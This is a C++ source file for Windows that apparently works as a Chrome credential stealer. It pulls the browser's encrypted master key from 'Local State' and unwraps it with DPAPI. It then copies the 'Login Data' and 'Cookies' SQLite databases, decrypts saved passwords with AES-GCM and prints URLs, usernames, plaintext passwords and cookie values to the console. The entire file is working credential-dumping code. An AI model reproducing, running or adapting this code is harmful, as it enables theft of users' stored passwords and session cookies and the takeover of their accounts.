#include "sqlite3.h"
#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include "base64.cpp"
#include "aes_gcm.cpp"

// class DATA_BLOB{
//     public:
//         DWORD cbData
//         POINTER(c_char) pbData
// };


// global variable declaration

void print_hex(BYTE* data, size_t dataLen){
    for(size_t i =0; i< dataLen; i++){
        printf("%02x ", data[i]);
    }
    printf("\n");
}

BYTE* get_data(DATA_BLOB blob_out){
    int cbData = int(blob_out.cbData);
    BYTE* pbData = blob_out.pbData;
    BYTE* buffer = new BYTE[cbData];
    // printf("made buffer in get_data...\n");
    memcpy(buffer, pbData, cbData);
    // printf("got data from blob!\n");
    return buffer;
}

BYTE* decrypt_data_dpapi(std::vector<uint8_t> encrypted_data) {
    // initialization of these variables are first to check for errors!
    std::string temp(encrypted_data.begin(), encrypted_data.end());
    size_t data_len = temp.length();
    BYTE* buffer_in = encrypted_data.data();

    BYTE* entropy = new BYTE[0];
    BYTE* buffer_entropy = entropy;

    // encrypted data blob init
    DATA_BLOB blob_in;
    blob_in.pbData = buffer_in;
    blob_in.cbData = data_len;

    // entropy data blob init
    DATA_BLOB blob_entropy;
    blob_entropy.pbData = buffer_entropy;
    blob_entropy.cbData = 0;

    // output data blob init
    DATA_BLOB blob_out;

    if (CryptUnprotectData(&blob_in, NULL, &blob_entropy, NULL, NULL, 0, &blob_out)) {
        // printf("it worked, I think? lol\n");
        delete[] (entropy);
        return get_data(blob_out);
    }
    else {
        DWORD dw = GetLastError();
        std::wcout << dw << std::endl;
        // printf("[!] Decryption Failed\n");
        delete[] (entropy);
        return NULL;
    }
}

std::string parse(std::string in_string, std::string token_1, std::string token_2){
    size_t parse_start = in_string.find(token_1) + token_1.length();
    // std::cout << token_1.length() << std::endl;
    // std::cout << parse_start << std::endl;
    size_t parse_end = in_string.find(token_2, parse_start);
    // std::cout << parse_end << std::endl;
    size_t parse_len = parse_end - parse_start;
    // std::cout << parse_len << std::endl;
    std::string parsed_string = in_string.substr(parse_start, parse_len);
    // std::cout << parsed_string << std::endl;
    return parsed_string;
}

std::string get_local_state() {
    // partially sourced from here https://stackoverflow.com/questions/42371488/saving-to-userprofile
    char* user_path = getenv("USERPROFILE");
    std::string local_state_path;
    local_state_path = std::string(user_path) + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State";
    // std::cout << "[+] Local state located at " << local_state_path << std::endl;


    std::ifstream file(local_state_path); //taking file as inputstream
    std::string local_state;
    if(file) {
        std::ostringstream ss;
        ss << file.rdbuf(); // reading data
        local_state = ss.str();
    }
    // std::cout<<str<<std::endl;

    return local_state;
}

void decrypt_password(std::string encrypted_pass, BYTE* key) {
    auto cipher = new AESGCM(key);
    // std::vector<uint8_t> ciphertext_vec;
    // try {
    // MessageBoxA(NULL, "", "", MB_OK);
    // auto cipher = new AESGCM(key);
    // std::string iv(encrypted_pass, 3, 12);
    std::vector<uint8_t> iv_vec(encrypted_pass.begin() + 3, encrypted_pass.begin() + 15);
    // printf("iv size = %d\n", iv_vec.size());
    BYTE* iv = &iv_vec[0];
    // std::string ct(encrypted_pass, 15, -1);
    std::vector<uint8_t> ciphertext_vec(encrypted_pass.begin() + 15, encrypted_pass.end() - 16);
    // printf("ciphertext size = %d\n", ciphertext_vec.size());
    BYTE* ciphertext = &ciphertext_vec[0];
    // std::string ciphertext(ct, 0, ciphertext.length() - 16);
    // std::string tag(ct, ct.length() - 16, -1);
    std::vector<uint8_t> tag_vec(encrypted_pass.end() - 16, encrypted_pass.end());
    // printf("tag size = %d \n", tag_vec.size());
    BYTE* tag = &tag_vec[0];

    // printf("Attempting decryption...\n");
    cipher->Decrypt(iv, (size_t)iv_vec.size(), ciphertext, (size_t)ciphertext_vec.size(), tag, (size_t)tag_vec.size());
    // printf("Decryption (probably) succesful!\n");
    
    // char* pt = new char[cipher->ptBufferSize+1];
    for (int i = 0; i < cipher->ptBufferSize; i++) {
        printf("%c", (char) cipher->plaintext[i]);
        // pt[i] = (char) cipher->plaintext[i];
    }
    printf("\n");
    // pt[cipher->ptBufferSize] = '\0';
    // printf("plaintext: %s\n", std::string(pt).c_str());
    // std::string str(pt);
    // printf("plaintext: %s\n", str.c_str());
    // delete[] &pt;
    // cipher->~AESGCM();
    // Sleep(0);
    delete cipher;
    
    // printf("right before return......\n");
    // Sleep(1);
    return;
    // }
    // catch (const std::exception& e) {
    //     printf("****************************************************");
    //     std::cout << e.what() << std::endl;

    //     try {
    //         cipher->plaintext = decrypt_data_dpapi(ciphertext_vec);
    //         char pt[cipher->ptBufferSize+1];
    //         for (int i = 0; i < cipher->ptBufferSize+1; i++) {
    //             pt[i] = (char) cipher->plaintext[i];
    //         }
    //         delete[] cipher->plaintext;
    //         return;
    //     }
    //     catch (const std::exception& e) {
    //         std::cout << e.what() << std::endl;
    //         return;
    //     }
    // }
    // return;
}

BYTE* get_encryption_key() {
    std::string local_state = get_local_state();

    // load the abase64 encoded key
    // std::string local_state_str(local_state);

    // std::cout << "local state: " << local_state << std::endl;
    // fputs (local_state , stdout);

    std::string b64_key = parse(local_state, "\"encrypted_key\":\"", "\"}");
    // std::cout << b64_key << std::endl;
    

    std::wstring b64_key_ws(b64_key.begin(), b64_key.end());
    std::vector<uint8_t> key = b64Decode(b64_key_ws);
    // print_hex((BYTE*) &key[0], key.size());
    // std::string str_key(key.begin(), key.end());
    // std::cout << str_key << std::endl;
    std::vector<uint8_t> concat_key(key.begin() + 5, key.end());
    // concat_key.push_back('\0');
    // printf("key length = %d\n", concat_key.size());
    // printf("calling decrypt_data_dpapi(concat_key)...\n");
    return decrypt_data_dpapi(concat_key);
}




int wmain(){
    // printf("I dump passwords!\n");

    // printf("parse test: \n");
    // std::string test = "\"encrypted_key\":\"RFBBUEkBAAAA0Iyd3wEV0RGMegDAT8KX6wEAAAA4WY+SdfdPTKkDpfy599OYAAAAAAIAAAAAABBmAAAAAQAAIAAAAPVGLuZrCAPDR3Mrt1TwieuPlWXPAR360Zzbus+dmoS/AAAAAA6AAAAAAgAAIAAAANZy9TftMwn/8v8Gp9Pi9J9EHqJwlVcS37HZdrAwp5o2MAAAALLpIkHwDr6Rr9VfGtID0+/8cZ69XUBrUiu2qkdSIUd+BIPOxvIeUBt7VIKLr/lEiEAAAADFGbynxzXnGbSSAPtc4QPqm8Xsx9fsFVFxHY9yyu43NYDBG6sCVR/7EW5Zx1miQoRZrk8sTD41RIrfT72VoWCB\"}";
    // printf(parse(test, "\"encrypted_key\":\"", "\"}").c_str());
    // printf("\n");
    // wprintf("%s", get_local_state());

    BYTE* key = get_encryption_key();  
    // print_hex(key, 32);
    // printf("Key retrieved: %s\n", key);

    char* user_path = getenv("USERPROFILE");
    std::string db_path = std::string(user_path) + "\\AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data";
    const char* filename = "Login Data.db";

    std::ifstream  src(db_path, std::ios::binary);
    std::ofstream  dst(filename, std::ios::binary);

    dst << src.rdbuf();

    // printf("%s\n", db_path.c_str());

    sqlite3* db;
    if (sqlite3_open(filename, &db) != 0) {
        printf("Can't open database... %s\n", sqlite3_errmsg(db));
        sqlite3_close(db);
        return -1;
    }
    // printf("Database opened! \n");

    sqlite3_stmt* pstmt;
    const char* query = "SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created";
    if (sqlite3_prepare(db, query, -1, &pstmt, NULL) != 0) {
        printf("SQL statement preparation failed... %s\n", sqlite3_errmsg(db));
        sqlite3_finalize(pstmt);
        sqlite3_close(db);
        return -1;
    }
    // printf("SQL statement prepared! \n");

    const unsigned char* origin_url;
    const unsigned char* action_url;
    const unsigned char* username_value;
    const unsigned char* password_value;
    // const unsigned char* date_created;
    // const unsigned char* date_last_used;
    // sqlite3_bind_text(pstmt, 0, 0, -1, NULL)
    while (sqlite3_step(pstmt) == SQLITE_ROW) {
        printf("---------------LOGIN DATA-----------------\n");
        origin_url = sqlite3_column_text(pstmt, 0);
        printf("Origin URL: %s\n", origin_url);
        action_url = sqlite3_column_text(pstmt, 1);
        printf("Action URL: %s\n", action_url);
        username_value = sqlite3_column_text(pstmt, 2);
        printf("Username: %s\n", username_value);
        password_value = sqlite3_column_text(pstmt, 3);
        const char* char_pass = reinterpret_cast<const char*>(password_value);
        std::string str_pass(char_pass);
        // printf("Password: %s\n", password_value);
        // printf("Char_pass: %s\n", char_pass);
        // printf("str_pass: %s\n", str_pass.c_str());
        try{
            decrypt_password( str_pass, key );
            // decrypt_password2( std::vector<const unsigned char*>( password_value ), key );
            // printf("Why the hell is this failing...\n");
        } catch (const std::exception& e) {
            std::cout << e.what() << std::endl;
            
        }
        
        // printf("Got passed password decrypt!\n");
        
    }
    // printf("SQL step failed or finished... %s\n", sqlite3_errmsg(db));

    sqlite3_finalize(pstmt);
    sqlite3_close(db);


    // --------------------GET COOKIES INSTEAD OF LOGIN DATA----------------------------------------------------


    db_path = std::string(user_path) + "\\AppData\\Local\\Google\\Chrome\\User Data\\default\\Cookies";
    filename = "Cookies.db";

    std::ifstream src2(db_path, std::ios::binary);
    std::ofstream dst2(filename, std::ios::binary);

    dst2 << src2.rdbuf();

    // printf("%s\n", db_path.c_str());

    sqlite3* db2;
    if (sqlite3_open(filename, &db2) != 0) {
        printf("Can't open database... %s\n", sqlite3_errmsg(db2));
        sqlite3_close(db2);
        return -1;
    }
    // printf("Database opened! \n");

    sqlite3_stmt* pstmt2;
    query = "SELECT host_key, name, value, path, expires_utc FROM cookies";
    query = "SELECT * FROM cookies";
    if (sqlite3_prepare(db2, query, -1, &pstmt2, NULL) != 0) {
        printf("SQL statement preparation failed... %s\n", sqlite3_errmsg(db2));
        sqlite3_finalize(pstmt2);
        sqlite3_close(db2);
        return -1;
    }
    // printf("SQL statement prepared! \n");

    const unsigned char* host_key;
    const unsigned char* name;
    const unsigned char* value;
    const unsigned char* path;
    const unsigned char* expires_utc;
    // const unsigned char* date_created;
    // const unsigned char* date_last_used;
    // sqlite3_bind_text(pstmt, 0, 0, -1, NULL)
    while (sqlite3_step(pstmt2) == SQLITE_ROW) {
        printf("---------------COOKIE-------------------\n");
        host_key = sqlite3_column_text(pstmt2, 0);
        printf("Host Key: %s\n", host_key);
        name = sqlite3_column_text(pstmt2, 1);
        printf("Name: %s\n", name);
        value = sqlite3_column_text(pstmt2, 2);
        printf("Value: %s\n", value);
        path = sqlite3_column_text(pstmt2, 3);
        printf("Path: %s\n", path);
        expires_utc = sqlite3_column_text(pstmt2, 4);
        printf("Expires on (UTC): %s\n", expires_utc);
        
        // printf("Got passed password decrypt!\n");
        
    }
    // printf("SQL step failed or finished... %s\n", sqlite3_errmsg(db));

    sqlite3_finalize(pstmt2);
    sqlite3_close(db2);


    return 0;
}